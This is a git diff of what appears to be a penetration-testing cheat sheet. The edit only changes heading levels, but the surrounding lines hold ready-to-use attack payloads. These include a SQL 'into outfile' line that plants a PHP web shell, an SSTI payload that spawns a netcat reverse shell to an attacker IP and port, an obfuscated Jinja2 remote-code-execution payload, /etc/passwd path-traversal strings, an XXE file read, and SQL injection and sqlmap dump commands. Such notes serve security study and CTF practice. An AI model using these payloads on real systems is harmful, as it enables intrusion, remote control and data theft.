@@ -16,7 +16,7 @@
 - [SSTI](#ssti)
 - [CMS](#cms)
 
-## BruteForce
+# BruteForce
 ### Wordlist
 
 | Name                      | Path                                                                    |
@@ -66,13 +66,13 @@ dirbuster
 owasp-zap
 ```
 
-## PhpMyAdmin
+# PhpMyAdmin
 ### Quick Shellcode
 ```sql
 SELECT "<?php system($_GET['cmd']); ?>" into outfile "/dir/dir/file.php"
 ```
 
-## MySql
+# MySql
 ### Connect to mysql
 ```bash
 mysql -h localhost -u myname -p
@@ -90,7 +90,7 @@ sqlite3 database.sqlite3
 ```
 or open in vs code
 
-## Influx DB
+# Influx DB
 
 [CVE-2019-20933 Influxdb](https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933)
 
@@ -111,11 +111,11 @@ or open in vs code
 > select * from "foo" # display all content of measurments (table) 'foo' (keep the doubles quotes)
 ```
 
-## Dynamodb
+# Dynamodb
 
 See [this page](../wiki/Cloud.md)
 
-## SQL Injection
+# SQL Injection
 ### SQLmap
 ```bash
 # See Vulnerability
@@ -144,7 +144,7 @@ sqlmap -u 'https://example.com/?arg=*' --dump -T table_example -D example_db --l
 ' OR 1=1 -- comment
 ```
 
-## Request
+# Request
 ### Curl
 ```bash
 curl 'http://example.com/login' -H 'Content-Type: application/x-www-form-urlencoded' --data-raw 'username=login&password=pass'
@@ -172,7 +172,7 @@ r = s.post('http://example.com/submit',
 print(r.status_code, r.url)
 ```
 
-## Path traversal
+# Path traversal
 
 [Bypassing with Unicode Compatibility](https://jlajara.gitlab.io/web/2020/02/19/Bypass_WAF_Unicode.html)
 
@@ -185,13 +185,13 @@ print(r.status_code, r.url)
 %252e%252e%252e%252e%252e%252fetc%252fpasswd%00
 ```
 
-## Download .git
+# Download .git
 ```bash
 githacker --url http://url/.git/ --folder result
 ```
 [Source](https://github.com/WangYihang/GitHacker)
 
-## XML external entity (XXE)
+# XML external entity (XXE)
 ### Read File
 ```xml
 <!DOCTYPE foo [
@@ -219,32 +219,32 @@ githacker --url http://url/.git/ --folder result
 <foo>Hello &file;</foo>
 ```
 
-## SSTI
+# SSTI
 [Github Websites Vulnerable To SSTI](https://github.com/DiogoMRSilva/websitesVulnerableToSSTI)
 
-#### Nunchucks (Nodejs)
+### Nunchucks (Nodejs)
 ```
 {{range.constructor("console.log(123)")()}} => 123
 {{range.constructor("return global.process.mainModule.require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f')")()}}
 ```
 
-#### Python (Jinja2)
+### Python (Jinja2)
 ```
 {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
 ```
 
-#### Golang
+### Golang
 ```
 {{.}}
 ```
 
-## CMS
-#### Scaning
+# CMS
+### Scaning
 ```bash
 wpscan --force update -e --url IP --disable-tls-checks
 ```
 
-## Interesting routes
+# Interesting routes
 ### Graphql
 
 ```
@@ -254,7 +254,7 @@ wpscan --force update -e --url IP --disable-tls-checks
 /graphql/console
 ```
 
-## Certificate
+# Certificate
 ```
 curl <url> --key KEY.key --cert CERT.cert
 ```
